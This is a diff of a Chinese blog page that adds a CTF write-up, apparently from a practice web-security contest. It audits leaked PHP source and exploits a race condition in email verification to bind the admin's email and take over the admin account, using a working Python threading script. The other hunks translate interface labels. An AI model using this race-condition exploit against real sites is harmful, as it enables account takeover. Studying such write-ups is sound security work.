@@ -313,7 +313,217 @@ function echologin()
 <pre><code>aaaaaaaaaa11.8.105/1aaaaaaaaaa129.2aaaaaa
 </code></pre><p>返回值就会为：<code>http://123.123.1.123/1</code>，通过<code>file_get_contents</code>就可以从我们的服务器上获取内容了。</p>
 <p><img src="/2019/10/25/Web安全测试个人赛练习/20191025011222610.png" alt="在这里插入图片描述"></p>
-<h1 id="一个hackerone的有趣的漏洞的复现的题目"><a href="#一个hackerone的有趣的漏洞的复现的题目" class="headerlink" title="一个hackerone的有趣的漏洞的复现的题目"></a>一个hackerone的有趣的漏洞的复现的题目</h1>
+<h1 id="一个hackerone的有趣的漏洞的复现的题目"><a href="#一个hackerone的有趣的漏洞的复现的题目" class="headerlink" title="一个hackerone的有趣的漏洞的复现的题目"></a>一个hackerone的有趣的漏洞的复现的题目</h1><p>题目存在git泄露，得到源码，进行代码审计。</p>
+<p>首先看一下<code>index.php</code>：</p>
+<pre><code class="php">//index.php
+&lt;?php
+require_once(&#39;init.php&#39;);
+header(&quot;Content-type: text/html; charset=utf-8&quot;);
+
+if(!isset($_SESSION[&#39;username&#39;])){
+    header(&#39;location: ./login.php&#39;);
+    exit;
+}
+$userObj = new zUser();
+$user = zUserFile::get_attrs($_SESSION[&#39;username&#39;]);
+$flag = &quot;&quot;;
+if($userObj-&gt;is_admin($_SESSION[&#39;username&#39;]) &amp;&amp; file_exists(FLAGFILE)){
+    $flag = &quot;WELL DONE! &quot;.file_get_contents(FLAGFILE);
+}
+?&gt;
+</code></pre>
+<p>可以看到要想获得flag，需要通过<code>is_admin()</code>的验证，跟踪这个函数：</p>
+<pre><code class="php">//class.user.php
+public function is_admin($username){
+    if(!zUserFile::validate_username($username)){
+        return false;
+    }
+    $user = zUserFile::get_attrs($username);
+    if($user[&#39;is_admin&#39;] === 1)
+        return true;
+    return false;
+}
+
+//获取$username的所有信息
+//从前面可以看到$users[&#39;attrs&#39;][$username] = array(&quot;email&quot; =&gt; $email, &quot;is_admin&quot; =&gt; 0, &quot;email_verify&quot; =&gt; 0, &quot;token&quot; =&gt; &quot;&quot;);
+public static function get_attrs($username){
+    $users = zUserFile::get_all_users();
+    if(!zUserFile::is_exists($username)){
+        return false;
+    }
+    return $users[&#39;attrs&#39;][$username];
+}
+</code></pre>
+<p>要想验证通过，需要<code>$user</code>里的<code>is_admin</code>值为1，发现这边并没有什么可以利用的点，继续审计，重点放在如何可以登录admin的账号，发现该系统存在切换关联账号的功能：</p>
+<pre><code class="php">//switch.php
+&lt;?php
+require_once(&#39;init.php&#39;);
+header(&quot;Content-type: text/html; charset=utf-8&quot;);
+
+if(!isset($_SESSION[&#39;username&#39;])){
+    header(&#39;location: ./login.php&#39;);
+    exit;
+}
+$userObj = new zUser();
+$user = zUserFile::get_attrs($_SESSION[&#39;username&#39;]);
+$users = zUserFile::get_relate_users($_SESSION[&#39;username&#39;]);
+$username = isset($_GET[&#39;username&#39;])?trim($_GET[&#39;username&#39;]):&#39;&#39;;
+if($username != false &amp;&amp; zUserFile::is_exists($username)){
+    $to_user = zUserFile::get_attrs($username);
+    if($user[&#39;email_verify&#39;] === 1 &amp;&amp; $to_user[&#39;email_verify&#39;] === 1 &amp;&amp; $user[&#39;email&#39;] === $to_user[&#39;email&#39;]){
+        $userObj-&gt;login2($username);
+        header(&#39;Location: ./&#39;);
+        exit;
+    }
+}
+
+//class.user.php
+public function login2($username){
+    $username = trim($username);
+    if(!zUserFile::validate_username($username)){
+        return false;
+    }
+    $_SESSION[&#39;username&#39;] = $username;
+    return true;
+}
+?&gt;
+</code></pre>
+<p>可以看到<code>login2</code>没有其他任何的验证，也就是说如果邮箱相同且均认证了，那么不同账号就可以相互切换登录。</p>
+<p>再想到一开始的注册页面给了<code>admin</code>的邮箱为<a href="mailto:`ambulong@vulnspy.com" target="_blank" rel="noopener">`ambulong@vulnspy.com</a><code>，那么思路应该就是注册一个账号，并关联到</code>admin<code>的邮箱上，这样就可以切换到</code>admin`帐号了。</p>
+<p>直接绑定管理员的邮箱肯定是不行的，该系统还存在修改绑定邮箱的功能，代码如下：</p>
+<pre><code class="php">//chgemail.php
+&lt;?php
+require_once(&#39;init.php&#39;);
+if(!isset($_SESSION[&#39;username&#39;])){
+    header(&#39;location: ./&#39;);
+    exit;
+}
+
+header(&quot;Content-type: text/html; charset=utf-8&quot;);
+$userObj = new zUser();
+if($userObj-&gt;is_admin($_SESSION[&#39;username&#39;])){
+    die(&#39;FORBIDDEN&#39;);
+}
+
+if(isset($_POST[&#39;submit&#39;])){
+    if(!chktoken()){
+        die(&#39;INVALID REQUEST&#39;);
+    }
+    $email = isset($_POST[&#39;email&#39;])?trim($_POST[&#39;email&#39;]):&#39;&#39;;
+    if($userObj-&gt;chg_email($_SESSION[&#39;username&#39;], $email))
+        die(&#39;SUCCESS&#39;);
+    else
+        die(&#39;FAILED&#39;);
+
+}
+
+//跟一下chg_email()函数
+//class.user.php
+public function chg_email($username, $email){
+    if(!zUserFile::is_exists($username)){
+        return false;
+    }
+    if($email == false || !zUserFile::validate_email($email)){
+        return false;
+    }
+    $user = zUserFile::get_attrs($username);
+    $old_email = $user[&#39;email&#39;];
+    $emails = zUserFile::get_emails();
+    if(isset($emails[$old_email])){
+        $emails[$old_email] = array_diff($emails[$old_email], array($username));
+        if($emails[$old_email] == false){
+            unset($emails[$old_email]);
+        }
+    }
+    zUserFile::update_attr($username, &#39;email_verify&#39;, 0);
+    zUserFile::update_attr($username, &#39;email&#39;, $email);
+    zUserFile::update_attr($username, &#39;token&#39;, &#39;&#39;);
+    $us = @is_array($emails[$email])?$emails[$email]:array();
+    $emails[$email] = array_merge($us, array($username));
+    return zUserFile::update_emails($emails);
+}
+</code></pre>
+<p>可以看到当你重新绑定邮箱的时候，<code>email_verify</code>就会变为0，而我们得不到管理员邮箱的认证，就无法绑定成功。所以要想成功绑定，还得取看一下认证功能的代码：</p>
+<pre><code class="php">//verify.php
+f(isset($_GET[&#39;token&#39;]) &amp;&amp; isset($_GET[&#39;username&#39;])){
+    $token = isset($_GET[&#39;token&#39;])?trim($_GET[&#39;token&#39;]):&#39;&#39;;
+    $username = isset($_GET[&#39;username&#39;])?trim($_GET[&#39;username&#39;]):&#39;&#39;;
+    if($token == false || $username == false){
+        die(&#39;INVALID INPUT&#39;);
+    }
+    if($userObj-&gt;verify_email($username, $token)){
+        $userObj-&gt;login($username);
+        header(&#39;location: ./&#39;);
+        exit;
+    }
+
+    die(&#39;INVALID TOKEN OR USERNAME&#39;);
+}
+
+//跟一下verify_email()
+//class.user.php
+public function verify_email($username, $token){
+    if(!zUserFile::is_exists($username)){
+        return false;
+    }
+    $token = trim($token);
+    if($token == false){
+        return false;
+    }
+    $user = zUserFile::get_attrs($username);//取出所有信息
+    $real_token = $user[&quot;token&quot;];            //取出用户的token
+    if(md5($real_token) !== md5($token)){    //验证token是否正确
+        return false;
+    }
+    //----存在条件竞争的地方----
+    zUserFile::update_attr($username, &#39;token&#39;, &#39;&#39;);            //清空token
+    zUserFile::update_attr($username, &#39;email_verify&#39;, 1);    //认证成功
+    return true;
+}
+</code></pre>
+<p>正常的认证流程应该是：</p>
+<ul>
+<li>① 填写绑定邮箱 </li>
+<li>② 收到带有token的认证邮件 </li>
+<li>③ 带着用户名和token去访问认证页面 </li>
+<li>④ token验证正确 </li>
+<li>⑤  <code>email_verify</code>置为1，前面填写的邮箱绑定成功</li>
+</ul>
+<p>而我们可以利用条件竞争，在上述正常流程的第4和第5步之间请求绑定<code>admin</code>的邮箱，由于没有验证<code>$email</code>的状态，所以要绑定的<code>$email</code>被重置为了<code>admin</code>的邮箱，这时再执行第5步，则可以认证成功。</p>
+<p>于是我们先注册一个账号，并且绑定自己的邮箱来得到token，然后再访问认证链接的同时快速的，请求绑定<code>admin</code>的邮箱，脚本如下：</p>
+<pre><code class="python">import requests
+import threading
+
+url = &quot;http://114.55.36.69:8023/&quot;
+verify_url= &quot;/verify.php?token=oust3dEPSxpoZ9wKUVjo8ZFleaGdZaff&amp;username=lethe3&quot;
+SESSION=&quot;9gr7bgt3ht65r3hbe3sgcm7032&quot;
+
+def verify_email():
+    res = requests.get(url + verify_url)
+    print(res.text)
+
+def reset_email():
+    reset_url = url + &quot;/chgemail.php?token=QNgbstcy&quot;
+    cookies = {&quot;PHPSESSID&quot;: SESSION}
+    data = {&quot;email&quot;: &quot;ambulong@vulnspy.com&quot;, &quot;submit&quot;: &quot;Submit&quot;}
+    res=requests.post(reset_url, cookies=cookies, data=data)
+    print(res.text)
+
+
+def main():
+    t1 = threading.Thread(target=verify_email, args=())
+    t2 = threading.Thread(target=reset_email, args=())
+    t1.start()
+    t2.start()
+    t1.join()
+    t2.join()
+
+if __name__ == &#39;__main__&#39;:
+    main()
+</code></pre>
+<p>运行后刷新页面，发现已经成功绑定管理员邮箱：<br><img src="/2019/10/25/Web安全测试个人赛练习/2019102516365379.png" alt="在这里插入图片描述"></p>
+<p>切换<code>admin</code>账号即可：<br><img src="/2019/10/25/Web安全测试个人赛练习/20191025163716493.png" alt="在这里插入图片描述"></p>
+
             <hr>
           </div>
           <br>
@@ -343,7 +553,7 @@ function echologin()
     <div class="d-none d-lg-block col-lg-2 toc-container">
       
   <div id="toc">
-    <p class="h4"><i class="far fa-list-alt"></i>&nbsp;TOC</p>
+    <p class="h4"><i class="far fa-list-alt"></i>&nbsp;目录</p>
     <div id="tocbot"></div>
   </div>
 
@@ -391,7 +601,7 @@ function echologin()
   <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
     <div class="modal-content">
       <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
         <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
           <span aria-hidden="true">&times;</span>
         </button>
@@ -399,7 +609,7 @@ function echologin()
       <div class="modal-body mx-3">
         <div class="md-form mb-5">
           <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
         </div>
         <div class="list-group" id="local-search-result"></div>
       </div>
